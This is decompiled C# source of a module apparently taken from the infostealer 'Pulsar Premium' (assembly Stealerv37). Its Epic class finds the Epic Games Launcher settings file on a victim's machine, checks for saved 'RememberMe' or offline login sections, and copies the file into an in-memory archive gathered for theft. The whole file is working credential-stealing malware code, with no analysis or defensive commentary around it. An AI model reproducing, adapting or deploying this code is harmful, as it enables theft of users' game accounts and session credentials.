// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.Epic
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;
using System.Text;

#nullable disable
namespace Intelix.Targets.Games;

public class Epic : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini");
    if (!File.Exists(path))
      return;
    string s = File.ReadAllText(path);
    if (!s.Contains("[RememberMe]") && !s.Contains("[Offline]"))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "Epic Games";
    string entryPath = "Epic\\GameUserSettings.ini";
    zip.AddFile(entryPath, Encoding.UTF8.GetBytes(s));
    counterApplications.Files.Add($"{path} => {entryPath}");
    counter.Games.Add(counterApplications);
  }
}
